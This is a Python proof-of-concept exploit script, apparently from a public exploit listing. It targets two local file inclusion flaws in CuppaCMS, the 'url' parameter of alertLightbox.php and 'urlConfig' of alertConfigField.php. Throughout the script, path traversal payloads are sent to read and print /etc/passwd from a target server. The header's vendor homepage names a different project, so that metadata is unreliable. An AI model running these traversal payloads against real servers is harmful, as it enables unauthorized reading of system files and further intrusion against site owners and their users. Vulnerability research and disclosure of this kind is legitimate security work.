#!/usr/bin/env python3

# Exploit title: CuppaCMS - multiple local file inclusions
# Vendor Homepage: https://glpi-project.org/
# Version: ?
# Tested on: Debian 10 web server
# Date: Jan 04, 2022
# Exploit author: Mateo HanÅ¾ek
# Example usage: python3 poc.py "http://IP_ADDRESS/CuppaCMS"


import requests                                                                                                                              
import argparse
import sys
    
headers = {}
headers['Accept'] = "*/*"
headers["Content-Type"] = "application/x-www-form-urlencoded"

def isVulnerable(url, script, param):
    try:
        u = url + script
        data = param+'=../../../../../../../../etc/passwd'
    
        req = requests.post(u, headers = headers, data = data)
        if('root:x:' in req.text):
            return True
    
    except:
        return False
    return False

def dumpPasswd(url, script, param, path):
    u = url + script
    data = param+'=../../../../../../../../'+path
    req = requests.post(u, headers = headers, data = data)
    print("\n[+] Dumping " + path + "\n")
    response = req.text
    for line in response.splitlines():
        if(":x:" in line):
            print(line)
    return

def main():
    parser = argparse.ArgumentParser(description="PoC exploit for CuppaCMS 4 January 2022.")
    parser.add_argument("url", type=str, metavar="URL", help="\t\t Specify url. Ex: 'http://10.10.10.10/CuppaCMS' ")
    
    args = parser.parse_args()
    url = args.url

    scriptOne = "/alerts/alertLightbox.php"
    parameterOne = "url"
    scriptTwo = "/alerts/alertConfigField.php"
    parameterTwo = "urlConfig"
   

    #Testing----------------
    
    print("Testing first LFI in " + scriptOne)
    if(isVulnerable(url, scriptOne, parameterOne)):
        print("[+] LFI vulnerable -> '" + url+scriptOne + "', parameter: $_POST['"+ parameterOne +"']")
        dumpPasswd(url, scriptOne, parameterOne, "/etc/passwd")
    else:
        print("[-] Not vulnerable")

    print("\nTesting second LFI in " + scriptTwo)
    

    if(isVulnerable(url, scriptTwo, parameterTwo)):
        print("[+] LFI vulnerable -> '" + url+scriptTwo + "', parameter: $_POST['" + parameterTwo + "']")
        dumpPasswd(url, scriptTwo, parameterTwo, "/etc/passwd")
    else:
        print("[-] Not vulnerable")
    
    #End Testing------------


if __name__ == "__main__":
    main()